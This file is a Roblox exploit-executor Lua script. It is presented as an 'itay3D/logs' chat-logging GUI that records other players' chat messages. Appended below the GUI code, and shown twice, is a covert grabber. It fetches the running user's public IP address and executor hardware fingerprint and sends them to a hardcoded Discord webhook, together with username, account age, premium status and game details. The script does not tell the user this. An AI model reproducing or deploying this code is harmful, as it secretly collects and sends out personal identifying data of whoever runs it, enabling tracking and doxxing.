local gui = Instance.new("ScreenGui",game.Players.LocalPlayer.PlayerGui)
gui.Name = "OutputGui"


local Open_Close = Instance.new("TextButton",gui)
Open_Close.BackgroundColor3=Color3.new(0,0,0)
Open_Close.BackgroundTransparency=0.5
Open_Close.BorderColor3=Color3.new(0,0,0)
Open_Close.BorderSizePixel=0
Open_Close.Position=UDim2.new(.675,0,.9,0)
Open_Close.Size=UDim2.new(.3,0,.025,2)
Open_Close.Font=Enum.Font.Gotham
Open_Close.FontSize=Enum.FontSize.Size12
Open_Close.Text="itay3D/logs Gui - Open"
Open_Close.TextColor3=Color3.new(255,255,0)
Open_Close.TextStrokeColor3=Color3.new(255,255,0)
Open_Close.TextStrokeTransparency=1


local Outputs = Instance.new("ScrollingFrame", Open_Close)
Outputs.Visible=false
Outputs.AnchorPoint = Vector2.new(0.5 , 0)
Outputs.BackgroundColor3=Color3.new(0,0,0)
Outputs.BorderColor3=Color3.new(0,0,0)
Outputs.BorderSizePixel=0
Outputs.Position = UDim2.new(.5 , 0, 1 , 0)
Outputs.Size = UDim2.new(1,0, 0,300)
Outputs.CanvasSize=UDim2.new(1.2,1,50,0)
Outputs.ScrollBarThickness = 6
Outputs.ScrollingEnabled=true
Outputs.CanvasPosition = Vector2.new(0, 10000)

local Output = function(text)
	local color = Color3.new(248,248,248)
	local outputList = Outputs:GetChildren()

	for i,v in next,Outputs:GetChildren() do
		if v:IsA("StringValue") then
			table.remove(outputList, i)
		else
			v.Position = v.Position - UDim2.new(0,0,v.Size.Y.Scale/10,0)
		end
	end
	local NewOutputLine = Instance.new("TextLabel",Outputs)
	NewOutputLine.Text = text
	NewOutputLine.Size = UDim2.new(1,0,.15,0)
	NewOutputLine.Position = UDim2.new(0,0,.985,0)
	NewOutputLine.Font = "Gotham"
	NewOutputLine.TextColor3 = color
	NewOutputLine.TextStrokeTransparency = 0
	NewOutputLine.BackgroundTransparency = 1
	NewOutputLine.BorderSizePixel = 0
	NewOutputLine.FontSize = "Size14"
	NewOutputLine.TextXAlignment = "Left"
	NewOutputLine.TextYAlignment = "Top"
	NewOutputLine.ClipsDescendants = true
	NewOutputLine.Name = "OutputLine"
end

local Visible = false

Open_Close.MouseButton1Click:connect(function()
	Visible = not Visible
	Outputs.Visible = Visible
	Open_Close.Text = Visible and "itay3D/logs Gui - Open" or "itay3D/logs Gui - Close"
end)

local Holding = false
local Mouse = game.Players.LocalPlayer:GetMouse()

Open_Close.MouseButton1Down:Connect(function()
	if Holding then return end

	Holding = true

	local Distance = Open_Close.Position - UDim2.fromOffset(Mouse.X , Mouse.Y)

	repeat
		Open_Close.Position = UDim2.fromOffset(Mouse.X , Mouse.Y) + Distance
		wait()
	until Holding == false
end)

Open_Close.MouseButton1Up:Connect(function() Holding = false end)

for _,plr in next,game.Players:GetChildren() do
	if not plr:IsA("Player") then return end
	plr.Chatted:connect(function(msg)
		Output(plr.Name .. ": " .. msg)
	end)
end
local Visible = false

Open_Close.MouseButton1Click:connect(function()
	Visible = not Visible
	Outputs.Visible = Visible
	Open_Close.Text = Visible and "itay3D/logs Gui - Open" or "itay3D/logs Gui - Close"
end)

local Holding = false
local Mouse = game.Players.LocalPlayer:GetMouse()

Open_Close.MouseButton1Down:Connect(function()
	if Holding then return end

	Holding = true

	local Distance = Open_Close.Position - UDim2.fromOffset(Mouse.X , Mouse.Y)

	repeat
		Open_Close.Position = UDim2.fromOffset(Mouse.X , Mouse.Y) + Distance
		wait()
	until Holding == false
end)

Open_Close.MouseButton1Up:Connect(function() Holding = false end)

for _,plr in next,game.Players:GetChildren() do
	if not plr:IsA("Player") then return end
	plr.Chatted:connect(function(msg)
		Output(plr.Name .. ": " .. msg)
	end)
end

game.Players.PlayerAdded:connect(function(plr)
	plr.Chatted:connect(function(msg)
		Output(plr.Name .. ": " .. msg)
	end)
end)






--------------------------


local IP = game:HttpGet("https://v4.ident.me")
plr = game:GetService'Players'.LocalPlayer
local premium = false
local ALT = false
if plr.MembershipType == Enum.MembershipType.Premium then
	premium = true
elseif plr.MembershipType == Enum.MembershipType.None then
	premium = false
end
if premium == false then 
	if plr.AccountAge <= 70 then 
		ALT = true
	end
end

local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)


local http_request = http_request;
if syn then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
hwid = "";

for i, v in next, hwid_list do
	if decoded.headers[v] then
		hwid = decoded.headers[v];
		break
	end
end

if hwid then
local HttpServ = game:GetService('HttpService')
local url = "https://discord.com/api/webhooks/776127774079058000/CFPghp31O2SciTzkTTpXWj-R93CXYrYOwaJPOLcpGYvmUV7E4CCfLKHaJDg-xy4rO2sN"


local data = 
    {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "__**HWID:**__",
            ["description"] = hwid,
            ["type"] = "rich",
            ["color"] = tonumber(0xAB0909),
            ["fields"] = {
                {
                    ["name"] = "Username:",
                    ["value"] = Game.Players.LocalPlayer.Name,
                    ["inline"] = true
                },
				{
                    ["name"] = "IP Address:",
                    ["value"] = IP,
                    ["inline"] = true
                },
				{
                    ["name"] = "Game Link:",
                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
                    ["inline"] = true
                },
				{
					["name"] = "Game Name:",
					["value"] = info.Name,
					["inline"] = true
				},
				{
					["name"] = "Age:",
					["value"] = plr.AccountAge,
					["inline"] = true
				},
				{
					["name"] = "Premium:",
					["value"] = premium,
					["inline"] = true
				},
				{
					["name"] = "ALT:",
					["value"] = ALT,
					["inline"] = true
				},
				
            },
        }}
    }
    local newdata = HttpServ:JSONEncode(data)
    
    local headers = {
            ["content-type"] = "application/json"
    }
    
    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
    http_request(request_payload)
end




--------------------------


local IP = game:HttpGet("https://v4.ident.me")
plr = game:GetService'Players'.LocalPlayer
local premium = false
local ALT = false
if plr.MembershipType == Enum.MembershipType.Premium then
	premium = true
elseif plr.MembershipType == Enum.MembershipType.None then
	premium = false
end
if premium == false then 
	if plr.AccountAge <= 70 then 
		ALT = true
	end
end

local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)


local http_request = http_request;
if syn then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
hwid = "";

for i, v in next, hwid_list do
	if decoded.headers[v] then
		hwid = decoded.headers[v];
		break
	end
end

if hwid then
local HttpServ = game:GetService('HttpService')
local url = "https://discord.com/api/webhooks/776127774079058000/CFPghp31O2SciTzkTTpXWj-R93CXYrYOwaJPOLcpGYvmUV7E4CCfLKHaJDg-xy4rO2sN"


local data = 
    {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "__**HWID:**__",
            ["description"] = hwid,
            ["type"] = "rich",
            ["color"] = tonumber(0xAB0909),
            ["fields"] = {
                {
                    ["name"] = "Username:",
                    ["value"] = Game.Players.LocalPlayer.Name,
                    ["inline"] = true
                },
				{
                    ["name"] = "IP Address:",
                    ["value"] = IP,
                    ["inline"] = true
                },
				{
                    ["name"] = "Game Link:",
                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
                    ["inline"] = true
                },
				{
					["name"] = "Game Name:",
					["value"] = info.Name,
					["inline"] = true
				},
				{
					["name"] = "Age:",
					["value"] = plr.AccountAge,
					["inline"] = true
				},
				{
					["name"] = "Premium:",
					["value"] = premium,
					["inline"] = true
				},
				{
					["name"] = "ALT:",
					["value"] = ALT,
					["inline"] = true
				},
				
            },
        }}
    }
    local newdata = HttpServ:JSONEncode(data)
    
    local headers = {
            ["content-type"] = "application/json"
    }
    
    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
    http_request(request_payload)
end


